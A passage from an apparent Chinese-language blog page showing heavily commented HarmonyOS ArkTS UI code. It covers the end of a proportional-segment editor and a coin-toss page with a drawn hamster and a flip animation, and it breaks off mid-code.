class="line">                .<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// 设置输入框占据剩余空间</span></span><br><span class="line">                .<span class="title function_">onChange</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123; <span class="comment">// 输入框内容变化时的回调</span></span><br><span class="line">                  item.<span class="property">title</span> = value; <span class="comment">// 更新单元格标题</span></span><br><span class="line">                &#125;);</span><br><span class="line">              <span class="comment">// 创建计数器组件</span></span><br><span class="line">              <span class="title class_">CounterComponent</span>(&#123;</span><br><span class="line">                <span class="attr">options</span>: &#123;</span><br><span class="line">                  <span class="attr">type</span>: <span class="title class_">CounterType</span>.<span class="property">COMPACT</span>, <span class="comment">// 设置计数器类型为紧凑型</span></span><br><span class="line">                  <span class="attr">numberOptions</span>: &#123;</span><br><span class="line">                    <span class="attr">label</span>: <span class="string">`当前占比`</span>, <span class="comment">// 设置计数器标签</span></span><br><span class="line">                    <span class="attr">value</span>: item.<span class="property">proportion</span>, <span class="comment">// 设置计数器初始值</span></span><br><span class="line">                    <span class="attr">min</span>: <span class="number">1</span>, <span class="comment">// 设置最小值</span></span><br><span class="line">                    <span class="attr">max</span>: <span class="number">100</span>, <span class="comment">// 设置最大值</span></span><br><span class="line">                    <span class="attr">step</span>: <span class="number">1</span>, <span class="comment">// 设置步长</span></span><br><span class="line">                    <span class="attr">onChange</span>: <span class="function">(<span class="params">value: number</span>) =&gt;</span> &#123; <span class="comment">// 计数器值变化时的回调</span></span><br><span class="line">                      item.<span class="property">proportion</span> = value; <span class="comment">// 更新单元格的比例</span></span><br><span class="line">                      <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// 重新计算角度</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="comment">// 创建删除按钮</span></span><br><span class="line">              <span class="title class_">Button</span>(<span class="string">&#x27;删除&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">splice</span>(index, <span class="number">1</span>); <span class="comment">// 从单元格数组中删除当前单元格</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// 重新计算角度</span></span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceBetween</span>) <span class="comment">// 设置行的宽度和内容对齐方式</span></span><br><span class="line">            .<span class="title function_">padding</span>(&#123; <span class="attr">left</span>: <span class="number">40</span>, <span class="attr">right</span>: <span class="number">40</span> &#125;); <span class="comment">// 设置左右内边距</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;.<span class="title function_">layoutWeight</span>(<span class="number">1</span>); <span class="comment">// 设置滚动区域占据剩余空间</span></span><br><span class="line">      &#125;.<span class="title function_">layoutWeight</span>(<span class="number">1</span>) <span class="comment">// 设置滚动区域占据剩余空间</span></span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span>, <span class="attr">bottom</span>: <span class="number">20</span> &#125;) <span class="comment">// 设置上下外边距</span></span><br><span class="line">      .<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>); <span class="comment">// 设置对齐方式为顶部对齐</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 创建添加新内容按钮</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;添加新内容&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 向单元格数组中添加新单元格</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">cells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(<span class="number">1</span>, <span class="string">&quot;新内容&quot;</span>, <span class="variable language_">this</span>.<span class="property">colorPalette</span>[<span class="variable language_">this</span>.<span class="property">colorIndex</span>++ % <span class="variable language_">this</span>.<span class="property">colorPalette</span>.<span class="property">length</span>]));</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">calculateAngles</span>(); <span class="comment">// 重新计算角度</span></span><br><span class="line">      &#125;).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span>, <span class="attr">bottom</span>: <span class="number">20</span> &#125;); <span class="comment">// 设置按钮的上下外边距</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置组件高度为100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置组件宽度为100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#f5f8ff&quot;</span>); <span class="comment">// 设置组件背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Coin"><a href="#Coin" class="headerlink" title="Coin"></a>Coin</h1><p>投硬币</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义地鼠组件</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Hamster</span> &#123;</span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">cellWidth</span>: number <span class="comment">// 单元格宽度</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建一个堆叠布局</span></span><br><span class="line">      <span class="comment">// 身体</span></span><br><span class="line">      <span class="title class_">Text</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 宽度为单元格宽度的一半</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span> * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// 高度为单元格高度的2/3</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#b49579&quot;</span>)<span class="comment">// 背景颜色</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(&#123; <span class="attr">topLeft</span>: <span class="string">&#x27;50%&#x27;</span>, <span class="attr">topRight</span>: <span class="string">&#x27;50%&#x27;</span> &#125;)<span class="comment">// 圆角</span></span><br><span class="line">        .<span class="title function_">borderColor</span>(<span class="string">&quot;#2a272d&quot;</span>)<span class="comment">// 边框颜色</span></span><br><span class="line">        .<span class="title function_">borderWidth</span>(<span class="number">1</span>) <span class="comment">// 边框宽度</span></span><br><span class="line">      <span class="comment">// 嘴巴</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">4</span>&#125;</span>lpx`</span>)<span class="comment">// 嘴巴的宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">5</span>&#125;</span>lpx`</span>)<span class="comment">// 嘴巴的高度</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// 填充不透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#e7bad7&quot;</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#563e3f&quot;</span>)<span class="comment">// 边框颜色</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// 边框宽度</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// 上边距</span></span><br><span class="line">      <span class="comment">// 左眼睛</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">9</span>&#125;</span>lpx`</span>)<span class="comment">// 左眼睛的宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span>)<span class="comment">// 左眼睛的高度</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// 填充不透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#313028&quot;</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#2e2018&quot;</span>)<span class="comment">// 边框颜色</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// 边框宽度</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span>&#125;</span>lpx`</span>, <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// 下边距和右边距</span></span><br><span class="line">      <span class="comment">// 右眼睛</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">9</span>&#125;</span>lpx`</span>)<span class="comment">// 右眼睛的宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span>)<span class="comment">// 右眼睛的高度</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// 填充不透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#313028&quot;</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">        .<span class="title function_">stroke</span>(<span class="string">&quot;#2e2018&quot;</span>)<span class="comment">// 边框颜色</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">1</span>)<span class="comment">// 边框宽度</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">3</span>&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// 下边距和左边距</span></span><br><span class="line">      <span class="comment">// 左眼瞳</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">20</span>&#125;</span>lpx`</span>)<span class="comment">// 左眼瞳的宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">15</span>&#125;</span>lpx`</span>)<span class="comment">// 左眼瞳的高度</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// 填充不透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#fefbfa&quot;</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2.5</span>&#125;</span>lpx`</span>, <span class="attr">right</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// 下边距和右边距</span></span><br><span class="line">      <span class="comment">// 右眼瞳</span></span><br><span class="line">      <span class="title class_">Ellipse</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">20</span>&#125;</span>lpx`</span>)<span class="comment">// 右眼瞳的宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">15</span>&#125;</span>lpx`</span>)<span class="comment">// 右眼瞳的高度</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>)<span class="comment">// 填充不透明度</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="string">&quot;#fefbfa&quot;</span>)<span class="comment">// 填充颜色</span></span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">bottom</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2.5</span>&#125;</span>lpx`</span>, <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">6</span>&#125;</span>lpx`</span> &#125;) <span class="comment">// 下边距和左边距</span></span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>).<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置组件的宽度和高度</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义页面组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">CoinTossPage</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellWidth</span>: number = <span class="number">50</span> <span class="comment">// 单元格宽度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">headsCount</span>: number = <span class="number">0</span> <span class="comment">// 正面朝上的次数</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">tailsCount</span>: number = <span class="number">0</span> <span class="comment">// 反面朝上的次数</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span> <span class="comment">// 旋转角度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">verticalOffset</span>: number = <span class="number">0</span> <span class="comment">// 纵向位移</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isAnimRun</span>: boolean = <span class="literal">false</span> <span class="comment">// 动画是否正在执行</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// 页面标题</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;抛硬币&#x27;</span>)</span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>)<span class="comment">// 高度设置为50</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)<span class="comment">// 宽度设置为100%</span></span><br><span class="line">        .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// 文本居中对齐</span></span><br><span class="line">        .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>)<span class="comment">// 字体颜色</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">20</span>); <span class="comment">// 字体大小</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 显示地鼠和计数</span></span><br><span class="line">      <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="title class_">Hamster</span>(&#123; <span class="attr">cellWidth</span>: <span class="variable language_">this</span>.<span class="property">cellWidth</span> &#125;) <span class="comment">// 创建地鼠组件</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// 设置线性渐变背景</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 显示反面朝上的次数</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.tailsCount&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// 显示100</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#9f7606&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// 设置线性渐变背景</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 显示正面朝上的次数</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.headsCount&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="string">&quot;#fefefe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>); <span class="comment">// 设置宽度和内容居中对齐</span></span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="comment">// 创建放大版地鼠组件</span></span><br><span class="line">          <span class="title class_">Hamster</span>(&#123; <span class="attr">cellWidth</span>: <span class="variable language_">this</span>.<span class="property">cellWidth</span> * <span class="number">3</span> &#125;)</span><br><span class="line">            .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>() ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>); <span class="comment">// 根据状态显示或隐藏</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 显示100</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">&quot;100&quot;</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#9f7606&quot;</span>)<span class="comment">// 字体颜色</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span> * <span class="number">3</span>&#125;</span>lpx`</span>)<span class="comment">// 字体大小</span></span><br><span class="line">            .<span class="title function_">visibility</span>(!<span class="variable language_">this</span>.<span class="title function_">isHeadsFaceUp</span>() ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">Hidden</span>)<span class="comment">// 根据状态显示或隐藏</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">              <span class="comment">// 旋转180度</span></span><br><span class="line">              <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">              <span class="attr">y</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">angle</span>: <span class="number">180</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">linearGradient</span>(&#123;</span><br><span class="line">          <span class="comment">// 设置线性渐变背景</span></span><br><span class="line">          <span class="attr">direction</span>: <span class="title class_">GradientDirection</span>.<span class="property">LeftBottom</span>,</span><br><span class="line">          <span class="attr">colors</span>: [[<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">0.0</span>], [<span class="string">&#x27;#fef888&#x27;</span>, <span class="number">0.5</span>], [<span class="string">&#x27;#ebcf2f&#x27;</span>, <span class="number">1.0</span>]]</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">rotate</span>(&#123;</span><br><span class="line">          <span class="comment">// 根据当前角度旋转</span></span><br><span class="line">          <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">y</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">rotationAngle</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="variable language_">this</span>.<span class="property">verticalOffset</span> &#125;) <span class="comment">// 设置纵向位移</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件处理</span></span><br><span class="line"> </span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimRun</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isAnimRun</span> = <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">          <span class="keyword">let</span> maxAnimationSteps = <span class="number">2</span> * (<span class="number">10</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>)); <span class="comment">// 计算最大动画次数</span></span><br><span class="line">          <span class="keyword">let</span> totalAnimationDuration = <span class="number">2000</span>; <span class="comment">// 动画总时长</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 第一次动画，向上抛出</span></span><br><span class="line">          <span class="title 